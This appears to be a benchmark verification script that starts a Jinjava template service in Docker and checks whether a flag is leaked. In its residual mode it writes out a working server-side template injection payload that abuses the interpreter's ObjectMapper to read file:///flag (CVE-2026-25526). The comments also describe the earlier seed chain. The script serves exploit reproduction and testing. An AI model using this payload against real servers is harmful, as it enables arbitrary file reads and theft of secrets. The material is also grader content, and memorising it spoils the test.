#!/usr/bin/env bash
# verify.sh --seed|--residual
# 0 = PCBFLAG from /flag appears in POST /render body
# 10 = blocked / not observed; 20 = env; 30 = usage
#
# seed:     ____int3rpr3t3r____.config.objectMapper + readValue(file:///flag)
#           (CVE-2025-59340; reaches v0 2.8.0, blocked on v1 2.8.1 getValue)
# residual: ForTag Introspector getReadMethod().invoke to pull config, then
#           the same ObjectMapper file:///flag chain (CVE-2026-25526).
# Residual is an inline literal. Never original_poc, never heldout, never seed fallback.
set -uo pipefail
: "${RUN_ID:?}" "${COMPOSE_PROJECT_NAME:?}" "${RUN_FLAG:?}" "${VERSION:?}" "${WORK_DIR:?}"
MODE="${1:-}"
[[ "$MODE" == "--seed" || "$MODE" == "--residual" ]] || { echo "usage: --seed|--residual" >&2; exit 30; }
CASE_DIR="$(cd "$(dirname "$0")/.." && pwd)"
PY="${PCB_PYTHON:-python3}"
mkdir -p "$WORK_DIR"

SVC="$VERSION"
PORT=""
for _ in $(seq 1 30); do
  PORT="$(docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" --profile "$VERSION" \
    port "$SVC" 8080 2>/dev/null | sed 's/.*://' | tr -d '[:space:]')"
  if [[ -z "$PORT" ]]; then
    CID="$(docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" --profile "$VERSION" \
      ps -q "$SVC" 2>/dev/null | head -1)"
    if [[ -n "$CID" ]]; then
      PORT="$(docker port "$CID" 8080 2>/dev/null | head -1 | sed 's/.*://' | tr -d '[:space:]')"
    fi
  fi
  if [[ -n "$PORT" ]]; then
    code="$(curl -sS --max-time 5 -o /dev/null -w '%{http_code}' \
      -X POST "http://127.0.0.1:${PORT}/render" \
      -H 'Content-Type: text/plain' \
      --data '{{ 1 }}' 2>/dev/null || true)"
    if [[ "$code" == "200" ]]; then
      break
    fi
  fi
  sleep 2
  PORT=""
done
if [[ -z "$PORT" ]]; then
  echo "verify: no mapped port for $SVC:8080" >&2
  exit 20
fi
export PCB_TARGET_PORT="$PORT"
export PYTHONPATH="$CASE_DIR${PYTHONPATH:+:$PYTHONPATH}"

if [[ "$MODE" == "--seed" ]]; then
  CAND="$("$PY" "$CASE_DIR/poc/original_poc.py" "$VERSION" 2>/dev/null || "$PY" "$CASE_DIR/poc/original_poc.py" 2>/dev/null)"
  CAND="${CAND:-"{}"}"
  CAND="$("$PY" -c "import json,sys
s = sys.argv[1]
try:
    json.loads(s)
    print(s)
except Exception:
    print(json.dumps({'template': s.strip()}))" "$CAND")"
  printf '%s' "$CAND" > "$WORK_DIR/cand.json"
else
  # CVE-2026-25526: ForTag uses Introspector getReadMethod().invoke, not
  # JinjavaBeanELResolver.getValue, so Interpreter.config is still reachable
  # on 2.8.1. Same ObjectMapper file:///flag sink as seed. Inline literal only.
  "$PY" - "$WORK_DIR/cand.json" <<'PY'
import json, sys
open(sys.argv[1], "w").write(json.dumps({
    "template": (
        "{% for _, config in ____int3rpr3t3r____ %}"
        "{% set om = config.objectMapper %}"
        "{% set st = om.typeFactory.constructFromCanonical('java.lang.String') %}"
        "{% set ut = om.typeFactory.constructFromCanonical('java.net.URL') %}"
        "{% set url = om.convertValue('file:///flag', ut) %}"
        "FLAG:{{ om.readValue(url, st) }}"
        "{% endfor %}"
    )
}))
PY
fi

OUT="$("$PY" "$CASE_DIR/poc/seed_exec.py" "$WORK_DIR/cand.json" "$VERSION" 2>&1)" || { echo "$OUT" >&2; exit 20; }
BODY="$(printf '%s' "$OUT" | "$PY" -c "import json,sys
try:
    d = json.load(sys.stdin)
    if isinstance(d, str):
        print(d)
    else:
        print(d.get('body') or d.get('fetched_body') or json.dumps(d, ensure_ascii=False))
except Exception:
    print('')" 2>/dev/null)"
echo "${BODY:0:500}"
if grep -q "$RUN_FLAG" <<<"$BODY"; then exit 0; else exit 10; fi
